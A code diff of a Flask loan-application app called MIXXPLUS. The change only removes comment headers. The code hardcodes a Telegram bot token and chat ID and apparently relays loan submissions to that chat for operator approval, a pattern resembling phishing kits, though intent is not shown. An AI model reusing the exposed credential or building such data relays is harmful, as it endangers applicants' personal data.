@@ -11,12 +11,10 @@ import time
 app = Flask(__name__)
 app.secret_key = 'mixxplus-2024'
 
-# ==================== TELEGRAM CONFIG ====================
 BOT_TOKEN = '8913073247:AAGWABeG_7SqZawTN_a_idiaSy4RDSBRIJg'
 CHAT_ID = '8589275340'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
-# ==================== DATABASE ====================
 last_update_id = 0
 
 def init_db():
@@ -50,7 +48,6 @@ def add_column():
 
 add_column()
 
-# ==================== TELEGRAM FUNCTIONS ====================
 def send_telegram(message, reply_markup=None):
     try:
         payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
@@ -63,7 +60,6 @@ def edit_telegram(message_id, text):
         requests.post(f'{TELEGRAM_API}/editMessageText', json={'chat_id': CHAT_ID, 'message_id': message_id, 'text': text})
     except Exception as e: print(f'Edit error: {e}')
 
-# ==================== POLL TELEGRAM ====================
 def poll_telegram():
     if 'RENDER' in os.environ: return
     global last_update_id
@@ -129,17 +125,13 @@ def poll_telegram():
 
 if 'RENDER' not in os.environ: threading.Thread(target=poll_telegram, daemon=True).start()
 
-# ==================== ROUTES ====================
 @app.route('/') 
 def index(): return render_template('index.html')
-
 @app.route('/apply') 
 def apply(): return render_template('apply.html')
-
 @app.route('/approve') 
 def approve(): return render_template('approve.html')
 
-# ==================== API ROUTES ====================
 @app.route('/api/submit_loan', methods=['POST'])
 def submit_loan():
     data = request.json
@@ -260,7 +252,6 @@ def webhook():
         conn.close()
     return jsonify({'ok':True})
 
-# ==================== MAIN ====================
 if __name__ == '__main__':
     print("🚀 MIXXPLUS RUNNING!")
     port = int(os.environ.get('PORT', 5000))
